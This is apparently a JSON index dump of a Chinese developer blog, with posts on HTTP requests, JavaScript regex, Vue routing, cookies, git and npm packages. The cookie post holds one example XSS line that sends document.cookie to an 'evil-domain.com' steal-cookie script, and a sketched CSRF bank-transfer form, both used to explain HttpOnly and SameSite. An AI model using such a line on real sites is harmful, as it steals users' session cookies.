用户再次访问，发起HTTP请求前，浏览器会读取之前保存的Cookie数据，并把数据写进请求头里的Cookie字段里再将请求头发送给服务器 服务器端发现客戶端发送过来的Cookie后，会去检查究竟是从哪一个客戶端发来的连接请求，然后对比服务器上的记录，最后得到该用戶的状态信息 四、总结HTTP请求流程 浏览器中的HTTP请求从发起到结束一共经历了如下八个阶段:构建请求、查找缓存、准 备IP和端口、等待TCP队列、建立TCP连接、发起HTTP请求、服务器处理请求、服务器返回请求和断开连接\n最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/computer-basics/06.http-request-process/","summary":"\u003cp\u003ehttp和TCP的关系? 什么是 HTTP协议？建立在TCP连接基础之上，一种允许浏览器向服务器获取资源(JavaScript、CSS、图片等)的协议\u0026hellip;\u003c/p\u003e","title":"网络进程：Http请求流程"},{"content":"正则表达式（regular expression）是一种表达文本模式（即字符串结构）的方法，有点像字符串的模板，常常用来按照“给定模式”匹配文本\u0026hellip;\n一、基础语法 新建正则表达式有两种方法:\n使用字面量，以斜杠/表示开始和结束 使用RegExp构造函数 // 在引擎编译代码时，就会新建正则表达式 // 效率较高、比较便利和直观。实际应用中，基本都采用这种方式 const regex = /xyz/i; // 运行时新建正则表达式 const regex = new RegExp(\u0026#39;xyz\u0026#39;, \u0026#39;i\u0026#39;); 第二个参数i，表示修饰符\ni: 忽略大小写 g: 全局匹配（global） m: 多行模式，会修改^和$的行为。默认情况下，^和$匹配字符串的开始处和结尾处，加上m修饰符以后，^和$会识别换行符\\n匹配行首和行尾 const reg = /world$/ const reg1 = /world$/m const str = \u0026#39;hello world\\n\u0026#39; reg.test(str) // false reg1.test(str) // true 1. 实例方法 test()返回一个布尔值，表示当前模式是否能匹配参数字符串 exec()用来返回匹配结果。匹配则返回一个数组，成员是匹配成功的子字符串，否则返回null var s = \u0026#39;_x_x\u0026#39;; var r1 = /x/; var r2 = /y/; r1.test(s) // true r1.exec(s) // [\u0026#34;x\u0026#34;] r2.exec(s) // null 2. 字符串的实例方法 String.prototype.match(): 对字符串进行正则匹配，返回匹配结果\n与正则对象的exec()类似：匹配成功返回一个数组，匹配失败返回null 带有g修饰符，则与正则对象的exec()行为不同，会一次性返回所有匹配成功的结果 const reg = /x/g; const reg1 = /x/; const reg2 = /y/; const str1 = \u0026#39;_x_x\u0026#39;; const str2 = \u0026#39;abba\u0026#39;; str1.match(reg1) // [\u0026#34;x\u0026#34;] str1.match(reg2) // null str1.match(reg) // [\u0026#34;x\u0026#34;, \u0026#34;x\u0026#34;] reg1.exec(str1) // [\u0026#34;x\u0026#34;] 3. 匹配规则 “字面量字符”: 正则表达式中，某个字符只表示它字面的含义(就像下面的a和b) 比如/a/匹配a，/b/匹配b\n元字符：除字面量字符外，还有一部分字符不代表字面的意思，有特殊含义 点字符.: 匹配除回车\\r、换行\\n 、行分隔符\\u2028和段分隔符\\u2029以外的所有字符 位置字符: ^ 表示字符串的开始位置，$表示字符串的结束位置 选择符: | 表示“或关系”（OR） 量词符?: 某个模式出现0次或1次，等同于{0, 1} 量词符\\*: 某个模式出现0次或多次，等同于{0,} 量词符+: 某个模式出现1次或多次，等同于{1,} 捕获符() const reg = /(.)b(.)/g; reg.test(\u0026#39;dbc\u0026#39;) // true reg.test(\u0026#39;db\u0026#39;) // false \u0026#39;abcdba\u0026#39;.match(reg) // [\u0026#39;abc\u0026#39;, \u0026#39;dba\u0026#39;] []: 字符集：连字符-和脱字符^ // [] 匹配这个集合中的任一一个字符(或元字符) // 脱字符`^`: 方括号内的第一个字符是`[^]`，则表示除了字符类之中的字符，其他字符都可以匹配 // 连字符`-`: 方括号内连续序列的字符，连字符`[-]`用来提供简写形式 const reg = /[^abc]/ const reg1 = /[abc]/ reg.test(\u0026#39;hello world\u0026#39;) // true reg.test(\u0026#39;bbc\u0026#39;) // false reg1.test(\u0026#39;ade\u0026#39;) // true reg1.test(\u0026#39;def\u0026#39;) // false [0-9a-fA-F] [a-zA-Z0-9_-] // 是指大小写字母、数字、下划线、横线中的一个字符 精确匹配次数{} {n} 精确匹配n次 {n,} 匹配n次以上 {n,m} 匹配n-m次 转义符: 如果要匹配特殊含义的元字符本身，需要在它们前面要加上反斜杠。比如要匹配+，就要写成\\+ /1+1/.test(\u0026#39;1+1\u0026#39;) // false /1\\+1/.test(\u0026#39;1+1\u0026#39;) // true 特殊字符 正则表达式对一些不能打印的特殊字符，提供了表达方法。 \\cX 表示Ctrl-[X]，其中的X是A-Z之中任一个英文字母，用来匹配控制字符 [\\b] 匹配退格键(U+0008)，不要与\\b混淆 \\n 匹配换行键 \\r 匹配回车键 \\t 匹配制表符 tab（U+0009） \\v 匹配垂直制表符（U+000B） \\f 匹配换页符（U+000C） \\0 匹配null字符（U+0000） \\xhh 匹配一个以两位十六进制数\\x00-\\xFF表示的字符 \\uhhhh 匹配一个以四位十六进制数\\u0000-\\uFFFF表示的 Unicode 字符 预定义模式 \\d 匹配0-9之间的任一数字，相当于[0-9] \\D 匹配所有0-9以外的字符，相当于[^0-9] \\w 匹配任意的字母、数字和下划线，相当于[A-Za-z0-9_] \\W 除所有字母、数字和下划线以外的字符，相当于[^A-Za-z0-9_] \\s 匹配空格（包括换行符、制表符、空格符等），相等于[ \\t\\r\\n\\v\\f] \\S 匹配非空格的字符，相当于[^ \\t\\r\\n\\v\\f] \\b 匹配词的边界 \\B 匹配非词边界，即在词的内部 const reg = /a\\b/ const reg1 = /a\\B/ const str = \u0026#39;abcdef\u0026#39; reg.test(str) // false reg1.test(str) // true 二、常用示例 // 非空 `/\\S/` 1.版本号 // 验证版本号的正则表达式，适配：x.x.x、x.x.x-beta.x、x.x.x-alpha.x格式 let reg = /^\\d+(\\.\\d+){2}(-([a-z]+)\\.\\d+)?$/i reg.test(\u0026#34;1.2.15-beta.15\u0026#34;) // true // 1.\\d+ 匹配一个或多个数字 // 2.(\\.\\d+){2} 匹配点号和一个或多个数字，重复2次 // 3.(-([a-z]+)\\.\\d+)? 匹配可选的 - 开头的字符串和一个或多个小写字母和点号，以及一个或多个数字，例如 -beta.1、 -alpha.2 等 // 4.$ 匹配字符串的结束位置。^ 匹配字符串的开始位置 // 5./i 表示不区分大小写，即忽略 -beta 或 -Beta 的大小写差异 若需满足每位版本号不能以0开头，且不能全部为0的要求，则需要自行拓展\n2.字符串: 模版渲染 // 1.利用非贪婪匹配 /\\{\\{(.*?)\\}\\}/g 匹配到到所有的 {{name}}，{{age}} // 2.利用str.replace(regexp|substr, newSubStr|function) ，其中第二个参数是 fucntion (replacement) ，该函数的返回值将替换掉第一个参数匹配到的结果，将所有匹配到的字符替换成指定的字符 var template = \u0026#34;{{name}}很厉害，才{{age}}岁\u0026#34; var context = {name:\u0026#34;bottle\u0026#34;,age:\u0026#34;15\u0026#34;} function render(template, context) { return template.replace(/{{(.*?)}}/g, (match, key) =\u0026gt; context[key.trim()]) } console.log(render(template, context)); // \u0026#34;bottle很厉害，才15岁\u0026#34; 参考 RegExp对象.阮一峰 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/frontend-develop/js-regular/","summary":"\u003cp\u003e正则表达式（regular expression）是一种表达文本模式（即字符串结构）的方法，有点像字符串的模板，常常用来按照“给定模式”匹配文本\u0026hellip;\u003c/p\u003e","title":"JavaScript正则表达式"},{"content":"Vue开发问题汇总\u0026hellip;\n一、Router 1.VueRouter 同一个/多个路由(复用同一个组件)页面不重新加载 问题描述：遇到相似的页面结构，我们通常通过以下两种方式加载同一个组件，达到组件实例复用的效果。毕竟，两个路由都渲染同个组件，比起销毁再创建，复用则显得更加高效。\n多个路由 一个路由添加不同的query、params等参数区分状态。 不过，复用组件实例意味着组件的生命周期钩子不会再被调用。那么会导致两种情况：\n想对路由参数的变化作出响应的话，可以简单地 watch (监测变化) $route 对象 export default { mounted () { this.reload() }, methods: { reload () {} }, watch: { \u0026#39;$route\u0026#39; (to, from) { console.log(\u0026#39;to=\u0026#39; + to) this.reload() } } } 参数变更或者路由变化想要重新加载组件实例时，则需要 Layout内的router-view重新加载 router-view 增加key不过这种方式存在的弊端可以思考一下 用v-if控制router-view，在根组件APP.vue中实现一个reload方法 第一种:\n\u0026lt;router-view :key=\u0026#34;$route.fullPath\u0026#34;\u0026gt;\u0026lt;/router-view\u0026gt; 第二种：\nLayout\n\u0026lt;template class=\u0026#34;dashboard-layout\u0026#34;\u0026gt; \u0026lt;!-- Layout left-menu --\u0026gt; \u0026lt;left-menu\u0026gt;\u0026lt;/left-menu\u0026gt; \u0026lt;!-- Layout main --\u0026gt; \u0026lt;container\u0026gt; \u0026lt;router-view v-if=\u0026#34;isRouterAlive\u0026#34; @collapseOrOpenMenu=\u0026#34;collapseOrOpenMenu\u0026#34;\u0026gt;\u0026lt;/router-view\u0026gt; \u0026lt;/container\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; export default { name: \u0026#39;AppLayout\u0026#39;, components: {}, data() { return {} }, computed: {}, methods: { async reload() { this.isRouterAlive = false // TODO：加载数据 await this.getAppMenus() this.$nextTick(() =\u0026gt; (this.isRouterAlive = true)) } }, async created() { // TODO：加载数据 await this.getAppMenus() window.APP_PAGE_ROOT = this } } \u0026lt;/script\u0026gt; 复用组件调用reload()\n\u0026lt;template class=\u0026#34;dashboard-page\u0026#34;\u0026gt; // ... content \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; export default { name: \u0026#39;ReusableComponent\u0026#39;, components: {}, data() { return {} }, computed: {}, watch: { $route: { deep: true, immediate: false, handler: function(to, from) { console.log(\u0026#39;--page-preview-to--\u0026#39;, to) if (to.path === \u0026#39;/dashboard/page\u0026#39; \u0026amp;\u0026amp; to.query.pageId !== from.query.pageId) { if (!window.APP_PAGE_ROOT) return window.location.reload() window.APP_PAGE_ROOT.reload() } } } }, methods: {} } \u0026lt;/script\u0026gt; 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/other/vue%E5%BC%80%E5%8F%91%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/","summary":"\u003cp\u003eVue开发问题汇总\u0026hellip;\u003c/p\u003e","title":"Vue开发问题汇总"},{"content":"我们都知道HTTP协议是无状态的，这种无状态意味着程序需要验证每一次请求，从而辨别客户端的身份。 Cookie，就是为了辨别客户端身份而储存在客户端本地的数据\n一、介绍Cookie Cookie由服务器生成，发送给浏览器，浏览器把cookie保存到内存中或者某个目录下的文件内，下一次请求同一网站时会把该cookie发送给服务器\n由于cookie是保存在客户端上的，所以浏览器加入了一些限制确保 cookie 不会被恶意使用，同时不会占据太多磁盘空间，所以 cookie 的数量和大小是有限的。 不同浏览器对 cookie 数量和大小的限制，是不一样的。一般来说，单个域设置的 cookie 不应超过50个，每个 cookie 的大小不能超过4KB。超过限制以后，cookie 将被忽略，不会被设置\n二、Cookie作用 对话管理：保存已登录用户的凭证 简单的缓存：存储一些简单的业务数据，比如购物车等需要记录的信息 个性化：保存用户的偏好，比如网页的字体大小、背景色等等 追踪：记录和分析用户行为 三、Cookie类别 第一方cookie：由相同站点发送的 cookie 第三方cookie：由跨站请求发送的cookie 关于相同站点、跨站的判断在讲到samesite属性的时候会介绍\n会话cookie：没有设置有效时间的 cookie。只要关闭了浏览器（注意不是关闭网页页面），cookie 就会被销毁。（cookie 存在于浏览器的内存中，当关闭了浏览器 cookie 就销毁了） 永久cookie：cookie 被保存在文件中，在有效时间内可长期存在，浏览器重启或机器重启都可以再次读取到cookie 四、cookie的特性 1.后端通过http头设置 服务端通过在http响应头中设置一个或多个Set-Cookie来设置 cookie\n2.请求时通过http头传给后端 浏览器接收到Set-Cookie指令时，会将cookie的名称与值储存在浏览器的cookie存放区，并记录该cookie隶属的域名、网址路径、创建时间、过期时间、是否脚本可访问、是否为安全连接 等属性。\n当浏览器再次发出HTTP Request指令到服务器时，就会比对目前在浏览器的 cookie 存放区有沒有该域名、该路径、尚未过期以及符合其它一些条件的cookie，如果有的话就会包含在 HTTP Request 指令的Cookie头中，多个cookie以分号;分隔。如下图: 假设浏览器在请求一个网页时，该网页包含 20 张图、3 个 CSS 文件、2 个 JavaScript 文件，那么同样一份 cookie 就会发送 25 次到服务端，如果 cookie 的大小有 4K 的话，光是浏览一个网页你可能就要从你的电脑发送出 100KB 的数据。 所以使用 cookie 并非「多多益善」，而是要「小心使用」，否则会造成不必要的带宽浪费。\n3.前端可读写 Javascript可以使用document.cookie对当前网站的cookie进行读写：\n注意：Javascript 可读写的 cookie 只能是没有用http-only限制的 cookie\n// 读取浏览器中的cookie console.log(document.cookie); // 写入两个 cookie：myname 和 myhome // 通过执行多次 document.cookie=... 语句来添加多个 cookie document.cookie=\u0026#39;myname=lhm;path=/;domain=.baidu.com\u0026#39;; document.cookie=\u0026#39;myhome=gd;path=/;domain=.baidu.com\u0026#39;; 如果要修改某个cookie，只需用document.cookie = ...语句创建一个同名的cookie，注意domain和path要保持一致。则原来的cookie会被覆盖，达到修改的目的。 如果要删除某个cookie，用document.cookie = \u0026hellip;语句将cookie的过期时间修改为一个过去的时间，如下： var exp = new Date(); exp.setTime(exp.getTime() - 1); document.cookie = \u0026#34;myhome=gd;path=/;domain=.baidu.com;expires=\u0026#34; + exp.toGMTString(); 将max-age设置为0也能达到删除的效果：\ndocument.cookie = \u0026#34;myhome=gd;path=/;domain=.baidu.com;max-age=0\u0026#34;; 4.遵守同源策略 当前网页只能访问与它同源的 cookie\n是否同源是用当前网页网址和cookie的domain来判断的。 谷歌浏览器通过F12-Application-Storage-Cookies-当前域名所查看到的 cookie，有两个来源，一是服务端通过在http响应头中设置的 cookie，二是浏览器在本地所读取到的 cookie。在本地读取 cookie 就需要遵守同源策略\n浏览器的同源策略中的同源指的是协议、域名、端口三者相同，而cookie的同源仅要求域名，也就是说，两个网址只要域名相同，就可以共享cookie，注意，这里不要求协议和端口相同。 所以https://example.com:8080/和http://example.com:8081/的cookie是共享的，因为它们的domain都是example.com 同源策略认为域和子域属于不同的域，例如child1.a.com与a.com、child1.a.com与child2.a.com、xxx.child1.a.com与child1.a.com两两不同源 一个页面可以为本域和任何父域设置cookie，只要父域不是公共后缀（public suffix）即可 所以两个不同的子域想要共享cookie，只要把 cookie 的domain设成相同的父域即可。 比如，http://child1.a.com 和 http://child2.a.com 想要共享cookie，只要把它们的 cookie 的domain设置成a.com即可\n设置cookie的时候，如果指定cookie的所属域名为像上面例子中的.baidu.com这样的顶级域名，那么二级域名和三级域名不用做任何设置，都可以读取这个cookie\n五、Cookie属性 1.Expires，Max-Age Expires属性指定一个具体的到期时间，到了指定时间以后，浏览器就不再保留这个cookie。它的值是UTC格式，可以使用Date.prototype.toUTCString()进行格式转换 Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; 浏览器根据本地时间，决定 cookie 是否过期，由于本地时间是不精确的，所以没有办法保证 cookie 一定会在服务器指定的时间过期\nMax-Age属性指定从现在开始 cookie 存在的秒数，比如60 * 60 * 24 * 365（即一年）。过了这个时间以后，浏览器就不再保留这个 cookie。 如果同时指定了Expires和Max-Age，那么Max-Age的值将优先生效。 如果Set-Cookie字段没有指定Expires或Max-Age属性，那么这个cookie就是Session Cookie，即它只在本次对话存在，一旦用户关闭浏览器，浏览器就不会再保留这个cookie 2.Domain Domain属性指定浏览器发出HTTP请求时，哪些域名要附带这个cookie\n如果没有指定该属性，浏览器会默认将其设为当前域名，这时子域名将不会附带这个 cookie 。 比如，example.com不设置 cookie 的domain属性，那么sub.example.com将不会附带这个 cookie\n举例验证一下：\n1、修改hosts文件，为本地设置了两个域名 2、在elin.com下的页面设置cookie，该 cookie 不设置domain 3、访问该页面并查看 cookie\n4、访问db.elin.com下的页面并查看 cookie\n可以看到子域名并不能看到这个 cookie\n如果指定了domain属性，那么子域名也会附带这个 cookie\n继续用上面的例子验证：\n1、修改elin.com下的页面的cookie设置，该 cookie 设置domain\n2、清除该页面下的 cookie，重新访问该页面并查看 cookie\n3、刷新db.elin.com下的页面并查看 cookie\n可以看到子域名可以看到这个 cookie\n如果服务器指定的域名不属于服务器当前域名或者其父域名，浏览器会拒绝这个 cookie\n继续用上面的例子验证：\n1、修改elin.com下的页面的cookie设置，该 cookie 的domain设置为一个不相关的域名\n2、清除该页面下的 cookie，重新访问该页面并查看 cookie\n可以看到没有 cookie，浏览器拒绝了这个 cookie\n3.Path Path属性指定浏览器发出HTTP请求时，哪些路径要附带这个cookie。 只要浏览器发现，Path属性值是HTTP请求路径的开头一部分，就会在头信息里面带上这个 cookie 。 比如，Path属性是/，那么请求/docs路径也会包含该cookie。当然，前提是域名必须一致\n4.Secure Secure属性指定浏览器只有在加密协议HTTPS下，才能将这个cookie发送到服务器。 该属性只是一个开关，不需要指定值`\n通过谷歌浏览器开发者工具控制台设置一个Cookie具有Secure属性\ndocument.cookie = \u0026#39;softwhy=\u0026#34;antzone\u0026#34;;max-age=1200;path=/;secure;\u0026#39; 上述代码执行结果会出现如下两种情况：\n如果站点采用HTTPS，那么Cookie生成成功 如果站点采用HTTP，那么Cookie生成失败 后端语言也遵循上面两条规则:\n如果连接到后端的请求采用 HTTPS，那么 Cookie 生成成功 如果请求采用 HTTP，那么 Cookie 生成失败，尽管在HTTP头部有对应的 Set-Cookie 内容，但不会真正成功生成对应的 Cookie 5.HttpOnly HttpOnly属性指定该cookie无法通过JavaScript脚本拿到，主要是document.cookie、XMLHttpRequest对象和Request API。防止该cookie被脚本读到，只有浏览器发出HTTP请求时，才会带上该cookie\n下面是跨站点载入的一个恶意脚本的代码，能够将当前网页的cookie发往第三方服务器。如果设置了一个cookie的HttpOnly属性，就不会读到该cookie\n(new Image()).src = \u0026#34;http://www.evil-domain.com/steal-cookie.php?cookie=\u0026#34; + document.cookie; 6.SameSite 6.1 SameSite 的作用 用来限制第三方 Cookie，减少安全风险\nChrome 51 开始，浏览器的 cookie 新增加了一个SameSite属性，SameSite 阻止浏览器将此 cookie 与跨站点请求一起发送，其主要目标是降低跨源信息泄漏的风险，同时也在一定程度上阻止了 CSRF 攻击和用户追踪\nCookie 往往用来存储用户的身份信息，恶意网站可以设法伪造带有正确 cookie 的HTTP请求，这就是CSRF 攻击\n举例来说，用户登陆了银行网站your-bank.com，银行服务器发来了一个 cookie\nSet-Cookie:id=a3fWa; 用户后来又访问了恶意网站malicious.com，上面有一个表单\n\u0026lt;form action=\u0026#34;your-bank.com/transfer\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; ... \u0026lt;/form\u0026gt; 用户一旦被诱骗发送这个表单，银行网站就会收到带有正确 cookie 的请求\nCookie 的 domain (your-bank.com) 与当前访问的网站 (malicious.com) 不一样，这种 cookie 就称为第三方 cookie。它除了用于 CSRF 攻击，还可以用于用户追踪。 比如，你的网页上请求了一张 Facebook 的图片，Facebook 返回数据的时候顺便返回了一个 cookie，这个 cookie 的 domain 是facebook.com\n\u0026lt;img src=\u0026#34;facebook.com/face.png\u0026#34;\u0026gt; 下次你再访问 Facebook 时发出的请求就会带有这个 cookie，从而 Facebook 就会知道你是谁了\n6.2 SameSite 的值 设置三个值：Strict、Lax、None\nStrict Strict 是最严格的防护，将阻止浏览器在所有跨站点请求中将 cookie 发送到目标站点。因此这种设置可以阻止所有 CSRF 攻击\nSet-Cookie: CookieName=CookieValue; SameSite=Strict;\n这个规则过于严格，可能造成非常不好的用户体验。比如，当前网页有一个 GitHub 链接，用户点击跳转就不会带有 GitHub 的 cookie，跳转过去总是未登陆状态。 不过，具有交易业务的网站很可能不希望从外站链接到任何交易页面，因此这种场景最适合使用 strict 标志。\nLax Lax规则稍稍放宽，大多数情况也是不发送第三方 cookie，但是导航到目标网址的Get请求除外。另外，使用JavaScript脚本发起的请求也无法携带第三方 cookie\nSet-Cookie: CookieName=CookieValue; SameSite=Lax;\n导航到目标网址的 GET 请求，只包括三种情况：\n链接\u0026lt;a href=\u0026quot;...\u0026quot;\u0026gt;\u0026lt;/a\u0026gt; 预加载请求\u0026lt;link rel=\u0026quot;prerender\u0026quot; href=\u0026quot;...\u0026quot;/\u0026gt; 以GET 方式提交的表单\u0026lt;form method=\u0026quot;GET\u0026quot; action=\u0026quot;...\u0026quot;\u0026gt; 设置了 Strict 或 Lax 以后，基本就杜绝了 CSRF 攻击。当然，前提是用户浏览器支持 SameSite 属性\nNone Chrome 计划将 Lax 变为默认设置。这时，网站可以选择显式关闭 SameSite 属性，将其设为None。不过，前提是必须同时设置Secure属性（Cookie 只能通过 HTTPS 协议发送），否则无效\n// 设置无效 Set-Cookie: widget_session=abc123; SameSite=None // 设置有效 Set-Cookie: widget_session=abc123; SameSite=None; Secure SameSite=None的 cookie 会在同站请求、跨站请求下发送：\n在旧版浏览器，如果SameSite属性没有设置，或者没有得到运行浏览器的支持，那么它的行为等同于None，Cookies会被包含在任何请求中——包括跨站请求。 但是，在Chrome 80+版本中，SameSite的默认属性是SameSite=Lax。换句话说，当 Cookie 没有设置 SameSite 属性时，将会视作 SameSite 属性被设置为Lax。如果想要指定 Cookies 在同站、跨站请求都被发送，那么需要明确指定 SameSite 为 None。具有 SameSite=None 的 Cookie 也必须标记为secure并通过HTTPS传送。 Chrome 也宣布，将在下个版本也就是Chrome 83版本，在访客模式下禁用第三方 Cookie，在2022年全面禁用第三方 Cookie，到时候，即使你能指定 SameSite 为 None 也没有意义，因为你已经无法写入第三方 Cookie 了。 6.3 跨站的判断 第一方cookie和第三方cookie的区别就是：是否是相同站点发送的（不同则为跨站）。 所以第三方cookie也可以理解为跨站请求所设置的cookie。 所以，第三方cookie定义中的跨站与samesite所作用的跨站请求中的跨站，两者的判断是一样的，所以我们放到一起来说。 那么怎么判断是不是形成跨站了呢？ 我们是拿 “请求的目标URL（或者cookie的domain）” 和 “当前网站URL（也就是浏览器地址栏中的网址）” 这两者来进行比较从而判断是否形成跨站的。 两者的ORIGIN的注册域相同则为相同站点，不同则构成跨站。所谓注册域，是指您可以购买或租用的域名，即公共后缀（public suffix）之下的一级，也称为顶级域名\n最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/computer-basics/07.cookie/","summary":"\u003cp\u003e我们都知道\u003ccode\u003eHTTP协议\u003c/code\u003e是\u003ccode\u003e无状态\u003c/code\u003e的，这种无状态意味着程序需要验证每一次请求，从而辨别客户端的身份。 \u003ccode\u003eCookie\u003c/code\u003e，就是为了辨别客户端身份而储存在客户端本地的数据\u003c/p\u003e","title":"浏览器: 关于cookie"},{"content":"摘要\u0026hellip;\n1..gitignore忽略文件无效 问题：.gitignore中已经标明忽略的文件目录下的文件，git push的时候还会出现在push的目录中\n原因：在git忽略目录中，新建的文件在git中会有缓存，如果某些文件已经被纳入了版本管理中，就算是在.gitignore中已经声明了忽略路径也是不起作用的，这时候我们就应该先把本地缓存删除，然后再进行git的push，这样就不会出现忽略的文件了\ngit清除本地缓存命令如下：\ngit rm -r --cached . git add . git commit -m \u0026#39;update .gitignore\u0026#39; 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/other/git-faq-summary/","summary":"\u003cp\u003e摘要\u0026hellip;\u003c/p\u003e","title":"Git: 使用常见问题汇总"},{"content":"使用npm package过程中，积累的一些依赖解决方案\u0026hellip;\n一、常规 1、node-sass 安装 Python 2.7 且配置环境变量 配置国内镜像 npm install -g mirror-config-china --registry=http://registry.npm.taobao.org npm install node-sass 2、monaco 代码编辑器\nmonaco-editor-vue monaco-editor-webpack-plugin 3、项目文档 docsify-cli 4、core-js JavaScript的模块化标准库，包括ECMAScript到2023的polyfill\ncore-js 二、前端框架 1、vue 1.1 vue-fragment 问题：Element中 菜单导航折叠后文字不隐藏\n解决思路：\n项目安装vue-fragment npm install --save vue-fragment 在main.js中引入 // main.js import Fragment from \u0026#39;vue-fragment\u0026#39; Vue.use(Fragment.Plugin) 将zMenu.vue中的\u0026lt;div\u0026gt;修改为\u0026lt;fragment\u0026gt;即可 \u0026lt;!-- 视图层 --\u0026gt; \u0026lt;el-menu style=\u0026#34;width: 100%;\u0026#34; :collapse=\u0026#34;isCollapse\u0026#34; :collapse-transition=\u0026#34;false\u0026#34; background-color=\u0026#34;#333\u0026#34; text-color=\u0026#34;#fff\u0026#34;\u0026gt; \u0026lt;z-menu :menus=\u0026#34;menus\u0026#34;\u0026gt;\u0026lt;/z-menu\u0026gt; \u0026lt;/el-menu\u0026gt; \u0026lt;!-- zMenu.vue --\u0026gt; \u0026lt;template\u0026gt; \u0026lt;fragment\u0026gt; \u0026lt;template v-for=\u0026#34;menu in menus\u0026#34;\u0026gt; \u0026lt;el-submenu v-if=\u0026#34;menu.children \u0026amp;\u0026amp; menu.children.length \u0026gt;= 1\u0026#34; :index=\u0026#34;menu.menuId + \u0026#39;\u0026#39;\u0026#34; :key=\u0026#34;menu.menuId\u0026#34;\u0026gt; \u0026lt;template slot=\u0026#34;title\u0026#34;\u0026gt; \u0026lt;i :class=\u0026#34;menu.icon\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;span slot=\u0026#34;title\u0026#34;\u0026gt;{{menu.menuName}}\u0026lt;/span\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;z-menu :menus=\u0026#34;menu.children\u0026#34;\u0026gt;\u0026lt;/z-menu\u0026gt; \u0026lt;/el-submenu\u0026gt; \u0026lt;el-menu-item v-else :index=\u0026#34;menu.menuId + \u0026#39;\u0026#39;\u0026#34; @click=\u0026#34;handleRouter(menu)\u0026#34; :key=\u0026#34;menu.menuId\u0026#34;\u0026gt; \u0026lt;i :class=\u0026#34;menu.icon\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;span slot=\u0026#34;title\u0026#34;\u0026gt;{{menu.menuName}}\u0026lt;/span\u0026gt; \u0026lt;/el-menu-item\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;/fragment\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; export default { name: \u0026#39;zMenu\u0026#39;, // 至关重要，就靠这个名字递归了 props: { menus: { type: Array, default: function () { return []; }, required: false } }, methods: { handleRouter(menu) { // 跳转路由 this.$router.push(menu.route); } } } \u0026lt;/script\u0026gt; 参考：element-ui 中 NavMenu 菜单导航折叠后文字不隐藏、fragment - npm\n1.2 vue-contextmenujs 右键菜单\nhttps://www.npmjs.com/package/vue-contextmenujs\n1.3 Vue.Draggable 拖拽\nhttps://www.npmjs.com/package/vuedraggable\n1.4 vue-property-decorator 装饰器写法\nhttps://www.npmjs.com/package/vue-property-decorator\n1.5 el-tree-select https://www.npmjs.com/package/el-tree-select\n三、工程化 1、编译 1.1 runtime-import 前端资源（js \u0026amp; css）运行时加载工具. https://www.npmjs.com/package/runtime-import\n2、监控日志 2.1 source-map 源文件解析Source Map\n四、其他 1、patch-package（修改源码补丁包） 源码的补丁包 patch-package\n最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/other/19.%E5%B8%B8%E7%94%A8npm-package%E4%BD%BF%E7%94%A8/","summary":"\u003cp\u003e使用npm package过程中，积累的一些依赖解决方案\u0026hellip;\u003c/p\u003e","title":"Node: 常用npm package使用"},{"content":"整个团队依赖初版Apr作为统一的Node方案，随着业务场景越来越丰富，一些插件、middle等公共配置成为最佳实践后，逐渐下沉到Apr框架中，让Apr越来越\u0026hellip;\n一、快速开始 1. create demo \u0026amp; init $ mkdir apr-example \u0026amp;\u0026amp; cd apr-example $ npm init 2. 安装使用 @lianpf/apr apr 涉及到公司保密级别影响，暂不能对外开放。故此处安装一个apr外部简易版。\nTips：\n内部会使用脚手架快速搭建，此处仅演示手动创建各文件流程。\n$ npm i @lianpf/apr -S $ npm i egg-bin egg-mock -D 3. 修改package.json 文件 修改scripts\n\u0026#34;scripts\u0026#34;: { \u0026#34;dev\u0026#34;: \u0026#34;egg-bin dev\u0026#34;, \u0026#34;test\u0026#34;: \u0026#34;egg-bin test\u0026#34; }, 增加\u0026quot;egg\u0026quot;\n\u0026#34;egg\u0026#34;: { \u0026#34;framework\u0026#34;: \u0026#34;@lianpf/apr\u0026#34; } 最终package.json版本:\n{ \u0026#34;name\u0026#34;: \u0026#34;apr-example\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;1.0.0\u0026#34;, \u0026#34;dependencies\u0026#34;: { \u0026#34;@lianpf/apr\u0026#34;: \u0026#34;^1.0.0\u0026#34; }, \u0026#34;devDependencies\u0026#34;: { \u0026#34;egg-bin\u0026#34;: \u0026#34;^4.3.5\u0026#34;, \u0026#34;egg-mock\u0026#34;: 